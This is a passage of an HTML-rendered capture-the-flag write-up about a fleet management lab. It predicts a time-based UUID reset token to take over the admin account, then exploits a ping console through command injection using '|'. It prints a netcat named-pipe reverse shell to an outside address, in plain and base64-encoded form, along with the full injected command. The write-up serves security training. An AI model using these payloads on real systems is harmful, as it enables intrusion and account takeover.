+<a id="__codelineno-6-67" name="__codelineno-6-67" href="#__codelineno-6-67"></a>                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;The estimated time at which the UUID was generated in &#39;</span><span class="si">%%</span><span class="s2">Y-</span><span class="si">%%</span><span class="s2">m-</span><span class="si">%%</span><span class="s2">d </span><span class="si">%%</span><span class="s2">H:</span><span class="si">%%</span><span class="s2">M:</span><span class="si">%%</span><span class="s2">S&#39; format, e.g. &#39;2021-03-17 16:42:11&#39;&quot;</span><span class="p">,</span>
+<a id="__codelineno-6-68" name="__codelineno-6-68" href="#__codelineno-6-68"></a>                        <span class="nb">type</span><span class="o">=</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S.</span><span class="si">%f</span><span class="s2">&quot;</span><span class="p">))</span>
+<a id="__codelineno-6-69" name="__codelineno-6-69" href="#__codelineno-6-69"></a>
+<a id="__codelineno-6-70" name="__codelineno-6-70" href="#__codelineno-6-70"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;uuid&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;The UUID to inspect&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-71" name="__codelineno-6-71" href="#__codelineno-6-71"></a>    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+<a id="__codelineno-6-72" name="__codelineno-6-72" href="#__codelineno-6-72"></a>
+<a id="__codelineno-6-73" name="__codelineno-6-73" href="#__codelineno-6-73"></a>    <span class="c1"># Validate GUID</span>
+<a id="__codelineno-6-74" name="__codelineno-6-74" href="#__codelineno-6-74"></a>    <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-6-75" name="__codelineno-6-75" href="#__codelineno-6-75"></a>        <span class="n">_</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">uuid</span><span class="p">)</span>
+<a id="__codelineno-6-76" name="__codelineno-6-76" href="#__codelineno-6-76"></a>    <span class="k">except</span><span class="p">:</span>
+<a id="__codelineno-6-77" name="__codelineno-6-77" href="#__codelineno-6-77"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Invalid UUID&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-78" name="__codelineno-6-78" href="#__codelineno-6-78"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-6-79" name="__codelineno-6-79" href="#__codelineno-6-79"></a>
+<a id="__codelineno-6-80" name="__codelineno-6-80" href="#__codelineno-6-80"></a>    <span class="c1"># Handle info printing</span>
+<a id="__codelineno-6-81" name="__codelineno-6-81" href="#__codelineno-6-81"></a>    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">info</span><span class="p">:</span>
+<a id="__codelineno-6-82" name="__codelineno-6-82" href="#__codelineno-6-82"></a>        <span class="n">printUUIDInfo</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">uuid</span><span class="p">)</span>
+<a id="__codelineno-6-83" name="__codelineno-6-83" href="#__codelineno-6-83"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-6-84" name="__codelineno-6-84" href="#__codelineno-6-84"></a>
+<a id="__codelineno-6-85" name="__codelineno-6-85" href="#__codelineno-6-85"></a>    <span class="c1"># Handle generation. Some optional arguments are required in this case</span>
+<a id="__codelineno-6-86" name="__codelineno-6-86" href="#__codelineno-6-86"></a>    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">base_time</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+<a id="__codelineno-6-87" name="__codelineno-6-87" href="#__codelineno-6-87"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Base time required - specify with &#39;-t&#39; or &#39;--base-time&#39;&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-88" name="__codelineno-6-88" href="#__codelineno-6-88"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-6-89" name="__codelineno-6-89" href="#__codelineno-6-89"></a>
+<a id="__codelineno-6-90" name="__codelineno-6-90" href="#__codelineno-6-90"></a>    <span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">genUUIDs</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">uuid</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">precision</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">range</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">base_time</span><span class="p">):</span>
+<a id="__codelineno-6-91" name="__codelineno-6-91" href="#__codelineno-6-91"></a>        <span class="nb">print</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
+<a id="__codelineno-6-92" name="__codelineno-6-92" href="#__codelineno-6-92"></a>
+<a id="__codelineno-6-93" name="__codelineno-6-93" href="#__codelineno-6-93"></a>    <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="s2">&quot;main&quot;</span><span class="p">:</span>
+<a id="__codelineno-6-94" name="__codelineno-6-94" href="#__codelineno-6-94"></a>    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+<p>After that, you can just rebuild the new version of the tool and ask the API to generate a new password for the <code>admin</code> user:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">POST</span> <span class="p">/</span><span class="n">api</span><span class="p">/</span><span class="n">auth</span><span class="p">/</span><span class="n">token</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">Host</span><span class="p">:</span> <span class="n">dashboard</span><span class="p">.</span><span class="n">fms</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">Cookie</span><span class="p">:</span> <span class="n">token</span><span class="p">=</span><span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="n">eyJzdWIiOiJkZW1vQGZtcy5jdGYiLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTc0NzQ0NzQxMX0</span><span class="p">.</span><span class="n">Kg9WhHqDVcx3H7Xy5K7-fz-RDxjg78cd1Wl4CyoRf6U</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">User-Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="n">5</span><span class="p">.</span><span class="n">0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">x86_64</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="p">/</span><span class="n">537</span><span class="p">.</span><span class="n">36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="p">/</span><span class="n">133</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="n">Safari</span><span class="p">/</span><span class="n">537</span><span class="p">.</span><span class="n">36</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">Accept</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">json</span><span class="p">,</span> <span class="n">text</span><span class="p">/</span><span class="n">plain</span><span class="p">,</span> <span class="p">*/*</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">json</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">://</span><span class="n">dashboard</span><span class="p">.</span><span class="n">fms</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">Referer</span><span class="p">:</span> <span class="n">https</span><span class="p">://</span><span class="n">dashboard</span><span class="p">.</span><span class="n">fms</span><span class="p">.</span><span class="n">ctf</span><span class="p">/</span><span class="n">docs</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="n">Accept-Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span><span class="p">,</span> <span class="n">br</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">keep-alive</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="p">{</span><span class="s2">&quot;email&quot;</span><span class="p">:</span><span class="s2">&quot;admin@fms.ctf&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p>Grab the value of the <code>timestamp</code> field in the response:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="n">200</span> <span class="n">OK</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">Date</span><span class="p">:</span> <span class="n">Sat</span><span class="p">,</span> <span class="n">17</span> <span class="n">May</span> <span class="n">2025</span> <span class="n">04</span><span class="p">:</span><span class="n">17</span><span class="p">:</span><span class="n">29</span> <span class="n">GMT</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">json</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">Content-Length</span><span class="p">:</span> <span class="n">62</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">keep-alive</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="p">{</span><span class="s2">&quot;detail&quot;</span><span class="p">:</span><span class="s2">&quot;ok&quot;</span><span class="p">,</span><span class="s2">&quot;timestamp&quot;</span><span class="p">:</span><span class="s2">&quot;2025-05-17T04:17:29.166084+00:00&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p>Then, you can use your brand new version of <code>guidtool</code> with the timestamp and the initial UUID given in the initial message:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">$</span> <span class="n">guidtool</span> <span class="n">-t</span> <span class="s1">&#39;2025-05-17 14:32:45.201323&#39;</span> <span class="n">14e355e1-f216</span><span class="p">-</span><span class="n">11ef-b19a-d0c637f44704</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">cc429cb0</span><span class="p">-</span><span class="n">332b</span><span class="p">-</span><span class="n">11f0-b19a-d0c637f44704</span>
+</code></pre></div>
+<p>The new version of the tool will generate only one splendid UUID that you can use to authenticate as <code>admin</code>. The URL should look like this:</p>
+<ul>
+<li><a href="https://dashboard.fms.ctf/account/change-password?token=cc429cb0-332b-11f0-b19a-d0c637f44704">https://dashboard.fms.ctf/account/change-password?token=cc429cb0-332b-11f0-b19a-d0c637f44704</a></li>
+</ul>
+<p>You can set up the password of the <code>admin</code> account and authenticate as the administrator.</p>
+<p>Let's grab a flag and read the next hint:</p>
+<p><img alt="Second hint" src="../res/nsec25/second-hint.png" /></p>
+<h3 id="rce-on-the-sensor">RCE on the sensor</h3>
+<p>So, there is a diagnostic console on the sensor. We have the IP(v6) address of the sensors and there is only one sensor enabled. So let's scan this one:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">9000</span><span class="p">:</span><span class="n">d37e</span><span class="p">:</span><span class="n">c40b</span><span class="p">:</span><span class="n">d1b5</span><span class="p">:</span><span class="n">218</span><span class="p">:</span><span class="n">55ff</span><span class="p">:</span><span class="n">fe94</span><span class="p">:</span><span class="n">ec1a</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">Host</span> <span class="n">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">echo-reply</span> <span class="n">ttl</span> <span class="n">59</span> <span class="p">(</span><span class="n">0</span><span class="p">.</span><span class="n">027s</span> <span class="n">latency</span><span class="p">).</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">Scanned</span> <span class="n">at</span> <span class="n">2025</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">17</span> <span class="n">17</span><span class="p">:</span><span class="n">12</span><span class="p">:</span><span class="n">54</span> <span class="n">CEST</span> <span class="k">for</span> <span class="n">14s</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="n">65534</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>         <span class="n">VERSION</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">22</span><span class="p">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>     <span class="n">syn-ack</span> <span class="n">ttl</span> <span class="n">59</span> <span class="n">OpenSSH</span> <span class="n">9</span><span class="p">.</span><span class="n">6p1</span> <span class="n">Ubuntu</span> <span class="n">3ubuntu13</span><span class="p">.</span><span class="n">11</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">)</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</code></pre></div>
+<p>The documentation of the FMS web site gave us the credentials (<code>app:sensor</code>), so we can just SSH on it:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">$</span> <span class="n">ssh</span> <span class="n">app</span><span class="nv">@9000</span><span class="p">:</span><span class="n">d37e</span><span class="p">:</span><span class="n">c40b</span><span class="p">:</span><span class="n">d1b5</span><span class="p">:</span><span class="n">218</span><span class="p">:</span><span class="n">55ff</span><span class="p">:</span><span class="n">fe94</span><span class="p">:</span><span class="n">ec1a</span>                     
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">app</span><span class="nv">@9000</span><span class="p">:</span><span class="n">d37e</span><span class="p">:</span><span class="n">c40b</span><span class="p">:</span><span class="n">d1b5</span><span class="p">:</span><span class="n">218</span><span class="p">:</span><span class="n">55ff</span><span class="p">:</span><span class="n">fe94</span><span class="p">:</span><span class="n">ec1a</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">password</span><span class="p">:</span> 
+</code></pre></div>
+<p>After few seconds of loading this beautiful user interface should appear:</p>
+<p><img alt="Beautiful user interface" src="../res/nsec25/ssh-panel.png" /></p>
+<p>Juste hit <code>c</code> and you got some kind of shell allowing you to make a <code>ping</code>:</p>
+<p><img alt="The ping connection" src="../res/nsec25/ssh-connectivity-test.png" /></p>
+<p>Obviously, there is a command injection on it. After some try you will discover that, at least, <code>;</code> and <code>&amp;</code> are filtered. So we have to use <code>|</code> for example</p>
+<p><img alt="RCE usage" src="../res/nsec25/rce-id.png" /></p>
+<p>And we got an RCE as the <code>app</code> user:</p>
+<p><img alt="RCE result" src="../res/nsec25/rce-id-result.png" /></p>
+<p>As a bonus, you can see your own request on the log:</p>
+<p><img alt="Bonus" src="../res/nsec25/log-rce.png" /></p>
+<p>Now that we have a RCE, we want to have a reverse shell, so let's make one. We choose to encode it with <code>base64</code> since there is some filtering.</p>
+<ul>
+<li>The initial reverse shell : <code>rm /tmp/ff; mkfifo /tmp/ff;cat /tmp/ff | /bin/sh -i 2&gt;&amp;1 | nc 9000:6666:6666:6666:216:3eff:feb1:8d80 8089 &gt; /tmp/ff</code></li>
+<li>The encoded reverse shell : <code>cm0gL3RtcC9mZjsgbWtmaWZvIC90bXAvZmY7Y2F0IC90bXAvZmYgfCAvYmluL3NoIC1pIDI+JjEgfCBuYyA5MDAwOjY2NjY6NjY2Njo2NjY2OjIxNjozZWZmOmZlYjE6OGQ4MCA4MDg5ID4gL3RtcC9mZg==</code></li>
+<li>The final command to run on the ping shell : <code>9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a | echo -n cm0gL3RtcC9mZjsgbWtmaWZvIC90bXAvZmY7Y2F0IC90bXAvZmYgfCAvYmluL3NoIC1pIDI+JjEgfCBuYyA5MDAwOjY2NjY6NjY2Njo2NjY2OjIxNjozZWZmOmZlYjE6OGQ4MCA4MDg5ID4gL3RtcC9mZg== | base64 -d -w 0 | sh</code></li>
+</ul>
+<p>After some recognition we have been able to find the next flag on the <code>/</code> folder:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">$</span> <span class="nb">ls </span><span class="n">-la</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">total</span> <span class="n">31</span>                                               
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">drwxr-xr-x</span>  <span class="n">20</span> <span class="n">root</span>   <span class="n">root</span>     <span class="n">25</span> <span class="n">May</span> <span class="n">15</span> <span class="n">20</span><span class="p">:</span><span class="n">43</span> <span class="p">.</span>           
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">drwxr-xr-x</span>  <span class="n">20</span> <span class="n">root</span>   <span class="n">root</span>     <span class="n">25</span> <span class="n">May</span> <span class="n">15</span> <span class="n">20</span><span class="p">:</span><span class="n">43</span> <span class="p">..</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">lrwxrwxrwx</span>   <span class="n">1</span> <span class="n">root</span>   <span class="n">root</span>      <span class="n">7</span> <span class="n">Apr</span> <span class="n">22</span>  <span class="n">2024</span> <span class="n">bin</span> <span class="p">-&gt;</span> <span class="n">usr</span><span class="p">/</span><span class="n">bin</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">drwxr-xr-x</span>   <span class="n">2</span> <span class="n">root</span>   <span class="n">root</span>      <span class="n">2</span> <span class="n">Feb</span> <span class="n">26</span>  <span class="n">2024</span> <span class="n">bin</span><span class="p">.</span><span class="n">usr</span><span class="o">-is</span><span class="n">-merged</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="n">drwxr-xr-x</span>   <span class="n">2</span> <span class="n">root</span>   <span class="n">root</span>      <span class="n">2</span> <span class="n">Apr</span> <span class="n">22</span>  <span class="n">2024</span> <span class="n">boot</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="n">drwxr-xr-x</span>   <span class="n">8</span> <span class="n">root</span>   <span class="n">root</span>    <span class="n">480</span> <span class="n">May</span> <span class="n">16</span> <span class="n">13</span><span class="p">:</span><span class="n">31</span> <span class="n">dev</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="n">drwxr-xr-x</span>  <span class="n">73</span> <span class="n">root</span>   <span class="n">root</span>    <span class="n">151</span> <span class="n">May</span> <span class="n">15</span> <span class="n">20</span><span class="p">:</span><span class="n">43</span> <span class="n">etc</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="n">-rw-r</span><span class="p">-</span><span class="n">-r</span><span class="p">--</span>   <span class="n">1</span> <span class="n">root</span>   <span class="n">root</span>     <span class="n">46</span> <span class="n">May</span> <span class="n">15</span> <span class="n">20</span><span class="p">:</span><span class="n">43</span> <span class="n">flag</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="c">#</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="p">$</span> <span class="nb">cat </span><span class="n">flag</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="n">FLAG</span><span class="p">-</span><span class="n">986ded23879c8f9173492f4257d3460ddea5b878</span>
+</code></pre></div>
+<p>One point, awesome:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">$</span> <span class="p">/</span><span class="n">snap</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">askgod</span> <span class="n">submit</span> <span class="n">FLAG</span><span class="p">-</span><span class="n">986ded23879c8f9173492f4257d3460ddea5b878</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span> <span class="n">score</span> <span class="n">your</span> <span class="n">team</span> <span class="n">1</span> <span class="n">points</span><span class="p">!</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">Message</span><span class="p">:</span> <span class="n">Destination</span> <span class="n">Reached</span><span class="p">,</span> <span class="n">look</span> <span class="n">around</span> <span class="k">for</span> <span class="n">your</span> <span class="n">next</span> <span class="n">treasure</span> <span class="n">3</span><span class="p">/</span><span class="n">6</span>
+</code></pre></div>
+<p>What about the third hint:</p>
+<p><img alt="" src="../res/nsec25/third-hint.png" /></p>
+<h3 id="i-want-a-new-device">I want a new device</h3>
+<p>The RCE allows to get the following information:</p>
+<ul>
+<li>Our current folder is <code>/home/app/sensor</code></li>
+<li>It contains the following folders and files</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>init.sh
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>pyproject.toml
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>src
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">  </span>console
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">  </span>console.egg-info
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>uv.lock
+</code></pre></div>
+<p>The <code>src</code> folder contains the source code of the back end in multiple <code>py</code> files. The <code>client.py</code> for example</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">[</span><span class="o">...</span><span class="p">]</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">DeviceConfiguration</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    <span class="n">model</span><span class="p">:</span> <span class="nb">str</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>    <span class="n">interface</span><span class="p">:</span> <span class="nb">str</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>    <span class="nd">@computed_field</span><span class="p">(</span><span class="n">return_type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>    <span class="nd">@property</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">mac</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>        <span class="k">return</span> <span class="n">netifaces</span><span class="o">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">interface</span><span class="p">)[</span><span class="n">netifaces</span><span class="o">.</span><span class="n">AF_LINK</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&quot;addr&quot;</span><span class="p">]</span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>    <span class="nd">@computed_field</span><span class="p">(</span><span class="n">return_type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>    <span class="nd">@property</span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">ip</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>        <span class="k">return</span> <span class="n">netifaces</span><span class="o">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">interface</span><span class="p">)[</span><span class="n">netifaces</span><span class="o">.</span><span class="n">AF_INET6</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&quot;addr&quot;</span><span class="p">]</span>
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>    <span class="nd">@computed_field</span><span class="p">(</span><span class="n">return_type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>    <span class="nd">@property</span>
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">machine_id</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>        <span class="k">return</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&quot;/etc/machine-id&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read_text</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>
+<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>    <span class="nd">@computed_field</span><span class="p">(</span><span class="n">return_type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
+<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>    <span class="nd">@property</span>
+<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">device_id</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>        <span class="n">hmac_obj</span> <span class="o">=</span> <span class="n">HMAC</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">mac</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">SHA256</span><span class="p">)</span>
+<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>        <span class="n">hmac_obj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">machine_id</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
